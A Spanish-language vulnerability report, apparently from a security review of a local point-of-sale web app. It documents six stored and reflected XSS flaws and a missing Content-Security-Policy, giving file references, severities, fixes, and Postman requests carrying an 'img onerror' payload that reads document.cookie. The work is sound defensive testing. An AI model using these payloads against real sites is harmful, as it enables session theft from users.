# Reporte XSS + CSP

Requests de la colección de Postman `Vulnerabilidades` › `XSS + CSP`, contra `http://localhost:5173`.

## 01 · XSS almacenado en la descripción de producto

| | |
|---|---|
| Archivo:línea | `producto/ProductoServicio.java:82-113` (descripción en `:102-103`), `frontend/src/pages/Productos.jsx:84-85`, `frontend/src/pages/Dashboard.jsx:60-61`, `frontend/src/pages/FacturaDetalle.jsx:58-59` |
| Impacto | Se ejecuta al abrir Productos o Dashboard; roba `pv_usuario` y la cookie de sesión |
| STRIDE / OWASP | Tampering, Information Disclosure · A03 Injection (XSS) |
| Severidad | **Crítica**: almacenado y se ejecuta automáticamente para cualquier usuario |

```json
{ "method": "POST", "url": "http://localhost:5173/api/auth/login", "body": "{\"username\":\"vendedor\",\"password\":\"vendedor\"}" }
{ "method": "PUT", "url": "http://localhost:5173/api/productos/3", "body": "{\"sku\":\"BEB-003\",\"nombre\":\"Jugo de Naranja 1L\",\"descripcion\":\"<img src=x onerror=alert(document.cookie)>\",\"precio\":6.75,\"costo\":4.10,\"stock\":60,\"stockMinimo\":15,\"categoriaId\":1,\"activo\":true}" }
{ "method": "GET", "url": "http://localhost:5173/api/productos/3" }
```

Respuesta: `200` · `{"id":3,"descripcion":"<img src=x onerror=alert(document.cookie)>",...}`; al abrir Productos o Dashboard se ejecuta el `onerror`.

## 02 · XSS almacenado en la descripción de categoría

| | |
|---|---|
| Archivo:línea | `producto/ProductoServicio.java:122-128`, `producto/CategoriaControlador.java:43-46`, `frontend/src/pages/Categorias.jsx:66-67` |
| Impacto | Se ejecuta al abrir Categorías; afecta a cajeros y administradores |
| STRIDE / OWASP | Tampering, Information Disclosure · A03 Injection (XSS) |
| Severidad | **Alta**: almacenado, requiere que la víctima abra la vista de categorías |

```json
{ "method": "POST", "url": "http://localhost:5173/api/categorias", "body": "{\"nombre\":\"Promo XSS\",\"descripcion\":\"<img src=x onerror=alert(document.cookie)>\"}" }
{ "method": "GET", "url": "http://localhost:5173/api/categorias" }
```

Respuesta: `200` · `{"id":7,"nombre":"Promo XSS","descripcion":"<img src=x onerror=alert(document.cookie)>"}`; al abrir Categorías se ejecuta el payload.

## 03 · XSS almacenado en el nombre del cliente

| | |
|---|---|
| Archivo:línea | `cliente/ClienteServicio.java:45-69`, `cliente/ClienteControlador.java:41-49`, `frontend/src/pages/Clientes.jsx:118-119` |
| Impacto | Se ejecuta al listar clientes; expone PII y la sesión de quien consulta |
| STRIDE / OWASP | Tampering, Information Disclosure · A03 Injection (XSS) |
| Severidad | **Alta**: almacenado, requiere que la víctima abra Clientes |

```json
{ "method": "POST", "url": "http://localhost:5173/api/clientes", "body": "{\"documento\":\"XSS-001\",\"nombre\":\"<img src=x onerror=alert(document.cookie)>\",\"email\":\"x@x.local\",\"telefono\":\"555\",\"direccion\":\"x\",\"activo\":true}" }
{ "method": "GET", "url": "http://localhost:5173/api/clientes" }
```

Respuesta: `200` · `{"id":6,"documento":"XSS-001","nombre":"<img src=x onerror=alert(document.cookie)>",...}`; al abrir Clientes se ejecuta el payload.

## 04 · XSS almacenado en el nombre de usuario del header

| | |
|---|---|
| Archivo:línea | `auth/AuthServicio.java:31-57`, `usuario/UsuarioServicio.java:63-80`, `frontend/src/layout/Layout.jsx:63-64` |
| Impacto | Se ejecuta en el header de todas las pantallas autenticadas; combinado con BAC-04 puede dirigirse a otro usuario |
| STRIDE / OWASP | Tampering, Information Disclosure · A03 Injection (XSS) |
| Severidad | **Alta**: requiere crear/modificar la cuenta o que la víctima use esa cuenta |

```json
{ "method": "POST", "url": "http://localhost:5173/api/auth/registro", "body": "{\"username\":\"<img src=x onerror=alert(document.cookie)>\",\"password\":\"pwn\",\"rol\":\"VENDEDOR\"}" }
{ "method": "POST", "url": "http://localhost:5173/api/auth/login", "body": "{\"username\":\"<img src=x onerror=alert(document.cookie)>\",\"password\":\"pwn\"}" }
{ "method": "GET", "url": "http://localhost:5173/api/auth/yo" }
```

Respuesta: `200` · `{"usuario":{"username":"<img src=x onerror=alert(document.cookie)>","rol":"VENDEDOR",...}}`; al iniciar sesión, el header ejecuta el payload.

## 05 · XSS reflejado en la exportación HTML de reportes

| | |
|---|---|
| Archivo:línea | `reporte/ReporteServicio.java:89-117`, `reporte/ReporteControlador.java:37-42` |
| Impacto | Un enlace crafted ejecuta JavaScript en el origen de la app y roba la sesión |
| STRIDE / OWASP | Tampering, Information Disclosure · A03 Injection (XSS) |
| Severidad | **Alta**: requiere que la víctima abra el enlace, pero no necesita sesión antes del fix de BAC |

```json
{ "method": "GET", "url": "http://localhost:5173/api/reportes/exportar/html?nombreCliente=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E&estado=COMPLETADA" }
```

Respuesta: `200` · `<p>Filtro: cliente=<img src=x onerror=alert(document.cookie)>, estado=COMPLETADA</p>`; el navegador ejecuta el `onerror`.

## 06 · XSS almacenado en las observaciones de una venta

| | |
|---|---|
| Archivo:línea | `venta/VentaServicio.java:173`, `frontend/src/pages/FacturaDetalle.jsx:74-78` |
| Impacto | Se ejecuta al abrir la factura; afecta a quien consulte la venta, incluido un admin |
| STRIDE / OWASP | Tampering, Information Disclosure · A03 Injection (XSS) |
| Severidad | **Alta**: almacenado, requiere hacer checkout y abrir la factura |

```json
{ "method": "POST", "url": "http://localhost:5173/api/auth/login", "body": "{\"username\":\"vendedor\",\"password\":\"vendedor\"}" }
{ "method": "POST", "url": "http://localhost:5173/api/ventas/carrito?productoId=1&cantidad=1&precio=5.50" }
{ "method": "POST", "url": "http://localhost:5173/api/ventas/checkout", "body": "{\"clienteId\":1,\"observaciones\":\"<img src=x onerror=alert(document.cookie)>\"}" }
```

Respuesta: `200` · `{"venta":{"id":5,"observaciones":"<img src=x onerror=alert(document.cookie)>",...},"items":[...]}`; al abrir `/facturas/5` se ejecuta el payload.

## 07 · Falta de Content-Security-Policy

| | |
|---|---|
| Archivo:línea | `config/SecurityConfig.java:28-29`, `frontend/nginx.conf:8` |
| Impacto | Sin CSP, cualquier inyección HTML ejecuta JavaScript y no hay restricción de exfiltración |
| STRIDE / OWASP | Tampering, Information Disclosure · A05 Security Misconfiguration |
| Severidad | **Media**: defensa en profundidad ausente; por sí sola no ejecuta código, pero agrava todos los XSS |

```json
{ "method": "GET", "url": "http://localhost:5173/" }
{ "method": "GET", "url": "http://localhost:5173/api/salud" }
```

Respuesta antes del fix: `200` sin cabecera `Content-Security-Policy`. Después del fix: `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'`.

---

Notas:

- Los payloads usan `<img src=x onerror=...>` porque un `<script>` insertado vía `innerHTML` no se ejecuta.
- Las peticiones están en `peticiones xss.json`. Ejecutar el login antes de las peticiones autenticadas para que Postman reutilice la cookie `PVSESSION`.
- El detalle de remediación y las pruebas se documentan en el PR de XSS + CSP.
